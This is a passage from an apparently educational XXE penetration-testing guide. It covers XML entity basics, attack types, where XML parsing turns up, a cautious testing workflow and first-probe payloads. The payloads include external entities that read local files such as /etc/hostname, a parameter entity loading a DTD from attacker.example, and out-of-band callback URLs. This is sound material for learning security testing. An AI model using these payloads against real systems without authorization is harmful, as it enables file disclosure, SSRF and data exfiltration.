+<li>application configuration disclosure</li>
+<li>source code disclosure</li>
+<li>environment variable disclosure</li>
+<li>SSRF against internal services</li>
+<li>cloud metadata access</li>
+<li>blind out-of-band data exfiltration</li>
+<li>error-based file disclosure</li>
+<li>denial of service through entity expansion</li>
+<li>parsing of malicious Office, SVG, SOAP, SAML, or XML-based uploads</li>
+<li>in some rare chains, remote code execution through parser-specific features or secondary vulnerabilities</li>
+</ul>
+<hr />
+<h2 id="useful-resources">Useful Resources</h2>
+<ul>
+<li><a href="https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html">HackTricks XXE / XEE</a></li>
+<li><a href="https://notes.incendium.rocks/pentesting-notes/web/injection/xxe">Incendium XXE Notes</a></li>
+<li><a href="https://portswigger.net/web-security/xxe">PortSwigger XXE</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/blind">PortSwigger Blind XXE</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XML External Entity Prevention Cheat Sheet</a></li>
+<li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing">OWASP XXE Processing</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">PayloadsAllTheThings XXE</a></li>
+<li><a href="https://github.com/GoSecure/dtd-finder">GoSecure DTD Finder</a></li>
+<li><a href="https://labs.detectify.com/writeups/how-to-fix-xxe-vulnerabilities-in-java/">Detectify — XXE in Office Open XML</a></li>
+</ul>
+<hr />
+<h2 id="basics">Basics</h2>
+<p>Most XXE testing is about answering eight questions:</p>
+<ol>
+<li>
+<p><strong>Does the application parse XML?</strong>
+   Example: SOAP, SAML, SVG, XML API, RSS, DOCX/XLSX/PPTX import, plist, XHTML, XML config upload.</p>
+</li>
+<li>
+<p><strong>Can I control the XML body or an XML-based file?</strong>
+   Example: raw XML request, uploaded SVG, uploaded Office document, imported XML feed.</p>
+</li>
+<li>
+<p><strong>Does the parser allow <code>DOCTYPE</code> declarations?</strong>
+   XXE usually requires a DTD or external entity declaration.</p>
+</li>
+<li>
+<p><strong>Does the parser resolve external entities?</strong>
+   Example: <code>file://</code>, <code>http://</code>, <code>https://</code>, <code>ftp://</code>, <code>jar://</code>.</p>
+</li>
+<li>
+<p><strong>Is the entity value reflected in the response?</strong>
+   If yes, this is in-band XXE.</p>
+</li>
+<li>
+<p><strong>If output is not reflected, can I prove parsing out-of-band?</strong>
+   Use DNS or HTTP callbacks with Burp Collaborator, interactsh, webhook.site, or a controlled listener.</p>
+</li>
+<li>
+<p><strong>Can the parser reach internal services?</strong>
+   XXE may become SSRF.</p>
+</li>
+<li>
+<p><strong>Can the parser read local files?</strong>
+   Test only harmless files first and avoid sensitive data extraction unless explicitly authorized.</p>
+</li>
+</ol>
+<p>A vulnerable flow often looks like this:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Attacker submits XML with external entity:
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Parser resolves entity:
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>    reads /etc/hostname
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>Application response includes:
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>    hostname value
+</span></code></pre></div>
+<hr />
+<h2 id="xml-quick-refresher">XML Quick Refresher</h2>
+<p>Simple XML:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span>alice<span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span><span class="nt">&lt;role&gt;</span>user<span class="nt">&lt;/role&gt;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p>XML with DTD:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="cp">&lt;!DOCTYPE user [</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="cp">  &lt;!ELEMENT user ANY&gt;</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>]&gt;
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span>alice<span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p>Internal entity:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="cp">&lt;!DOCTYPE user [</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="cp">  &lt;!ENTITY marker &quot;xxe-test-73921&quot;&gt;</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>]&gt;
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;marker;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p>External entity:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="cp">&lt;!DOCTYPE user [</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>]&gt;
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p>Parameter entity:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="cp">&lt;!DOCTYPE user [</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="cp">  &lt;!ENTITY % ext SYSTEM &quot;http://attacker.example/test.dtd&quot;&gt;</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">  </span>%ext;
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>]&gt;
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span>test<span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="nt">&lt;/user&gt;</span>
+</span></code></pre></div>
+<p>Important distinction:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>General entity:      &amp;entity;
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Parameter entity:    %entity;
+</span></code></pre></div>
+<p>Parameter entities are especially useful in blind and external-DTD XXE testing.</p>
+<hr />
+<h2 id="main-xxe-types">Main XXE Types</h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Meaning</th>
+<th>Typical signal</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>In-band XXE</td>
+<td>Entity output is returned in the HTTP response.</td>
+<td>File contents or marker appears in response.</td>
+</tr>
+<tr>
+<td>Blind XXE</td>
+<td>Entity is processed, but output is not returned.</td>
+<td>DNS/HTTP callback.</td>
+</tr>
+<tr>
+<td>Out-of-band XXE</td>
+<td>Parser makes a request to attacker-controlled domain.</td>
+<td>Burp Collaborator/interactsh hit.</td>
+</tr>
+<tr>
+<td>Error-based XXE</td>
+<td>File contents appear inside parser error message.</td>
+<td>XML parser exception leaks data.</td>
+</tr>
+<tr>
+<td>SSRF via XXE</td>
+<td>External entity points to internal HTTP service.</td>
+<td>Internal response or callback.</td>
+</tr>
+<tr>
+<td>File-read XXE</td>
+<td>External entity reads local file.</td>
+<td><code>/etc/hostname</code>, <code>/etc/passwd</code>, Windows hosts file.</td>
+</tr>
+<tr>
+<td>Parameter-entity XXE</td>
+<td>Uses <code>%entity;</code> inside DTD.</td>
+<td>Often works when normal entities fail.</td>
+</tr>
+<tr>
+<td>External-DTD XXE</td>
+<td>Parser loads attacker-hosted DTD.</td>
+<td>OOB request to DTD server.</td>
+</tr>
+<tr>
+<td>XInclude injection</td>
+<td>XML processor supports XInclude.</td>
+<td>Included file/output appears.</td>
+</tr>
+<tr>
+<td>Entity expansion DoS</td>
+<td>Nested entities exhaust resources.</td>
+<td>Slowdown, parser crash, memory exhaustion.</td>
+</tr>
+<tr>
+<td>Second-order XXE</td>
+<td>Malicious XML stored first and parsed later.</td>
+<td>Callback or output appears during background processing.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="where-to-test">Where to Test</h2>
+<p>Test anything that accepts or processes XML or XML-based formats.</p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XML APIs</td>
+<td><code>Content-Type: application/xml</code>, <code>text/xml</code></td>
+</tr>
+<tr>
+<td>SOAP APIs</td>
+<td>SOAP envelopes, WSDL-based services</td>
+</tr>
+<tr>
+<td>SAML</td>
+<td>SAML responses, metadata imports</td>
+</tr>
+<tr>
+<td>SVG upload</td>
+<td>avatar, logo, image processing</td>
+</tr>
+<tr>
+<td>Office upload</td>
+<td>DOCX, XLSX, PPTX import or preview</td>
+</tr>
+<tr>
+<td>RSS/Atom feeds</td>
+<td>feed importer, blog importer</td>
+</tr>
+<tr>
+<td>XML config upload</td>
+<td>integration settings, admin import</td>
+</tr>
+<tr>
+<td>Mobile APIs</td>
+<td>older XML-based endpoints</td>
+</tr>
+<tr>
+<td>PDF/document generation</td>
+<td>XML-to-PDF, XSLT processors</td>
+</tr>
+<tr>
+<td>WebDAV</td>
+<td>XML request bodies</td>
+</tr>
+<tr>
+<td>plist files</td>
+<td>Apple/iOS/macOS integrations</td>
+</tr>
+<tr>
+<td>XHTML</td>
+<td>HTML parsed as XML</td>
+</tr>
+<tr>
+<td>XML-RPC</td>
+<td>legacy APIs</td>
+</tr>
+<tr>
+<td>XSLT</td>
+<td>XML transformation features</td>
+</tr>
+<tr>
+<td>File converters</td>
+<td>LibreOffice, ImageMagick, custom parsers</td>
+</tr>
+<tr>
+<td>Background jobs</td>
+<td>async import, report generation, antivirus/content extraction</td>
+</tr>
+</tbody>
+</table>
+<p>Interesting headers:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Content-Type: application/xml
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Content-Type: text/xml
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Content-Type: application/soap+xml
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>Content-Type: application/xhtml+xml
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>Content-Type: image/svg+xml
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>Accept: application/xml
+</span></code></pre></div>
+<p>Interesting file types:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>.xml
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>.svg
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>.xsl
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>.xslt
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>.xhtml
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>.wsdl
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>.rss
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>.atom
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>.docx
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>.xlsx
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>.pptx
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>.odt
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>ods
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>odp
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>.plist
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>.kml
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>.gpx
+</span></code></pre></div>
+<p>Interesting parameter names:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>xml
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>data
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>body
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>payload
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>document
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>file
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>config
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>import
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>feed
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>rss
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>saml
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>metadata
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>svg
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>template
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>report
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>content
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>message
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>request
+</span></code></pre></div>
+<hr />
+<h2 id="safe-testing-workflow">Safe Testing Workflow</h2>
+<ol>
+<li>Confirm scope and authorization.</li>
+<li>Identify XML parsing functionality.</li>
+<li>Capture a normal request or file upload.</li>
+<li>Change only one field at a time.</li>
+<li>Start with harmless internal entity replacement:</li>
+</ol>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="cp">  &lt;!ENTITY marker &quot;xxe-test-73921&quot;&gt;</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>]&gt;
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;marker;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<ol>
+<li>If reflected, test controlled local files:</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>/etc/hostname
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>/etc/issue
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>C:\Windows\System32\drivers\etc\hosts
+</span></code></pre></div>
+<ol>
+<li>If not reflected, test OAST/DNS callback:</li>
+</ol>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example/&quot;&gt;</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>]&gt;
+</span></code></pre></div>
+<ol>
+<li>If normal external entities fail, try parameter entities.</li>
+<li>If external network is blocked, test error-based behavior carefully.</li>
+<li>Avoid denial-of-service payloads on production.</li>
+<li>Avoid extracting sensitive files unless explicitly authorized.</li>
+<li>Prove impact with minimum safe evidence.</li>
+</ol>
+<p>Good low-impact proof targets:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>/etc/hostname
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>/etc/issue
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>/proc/version
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>C:\Windows\System32\drivers\etc\hosts
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>http://xxe-test-73921.oast.example/
+</span></code></pre></div>
+<p>Avoid as first proof:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>/etc/shadow
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>private keys
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>cloud credentials
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>application secrets
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>database passwords
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>large files
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>billion laughs payloads
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>recursive entity bombs
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>destructive internal URLs
+</span></code></pre></div>
+<hr />
+<h2 id="first-probe-payloads">First Probe Payloads</h2>
+<h3 id="internal-entity-test">Internal Entity Test</h3>
+<p>This checks whether custom entities are processed.</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="cp">  &lt;!ENTITY marker &quot;xxe-test-73921&quot;&gt;</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>]&gt;
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;marker;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Expected result:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>xxe-test-73921 appears in response → entity expansion works
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>payload unchanged                  → entity not expanded or wrong context
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>parser error                       → DTD blocked or parser reached
+</span></code></pre></div>
+<h3 id="basic-external-entity-callback">Basic External Entity Callback</h3>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example/&quot;&gt;</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>]&gt;
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Signals:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>DNS callback       → parser resolved external host
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>HTTP callback      → parser fetched external entity
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>no callback        → external entities disabled or egress blocked
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>parser error       → DTD parsed but resolution failed or blocked
+</span></code></pre></div>
+<h3 id="basic-file-read">Basic File Read</h3>
+<p>Linux:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>]&gt;
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="w">  </span><span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Windows:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
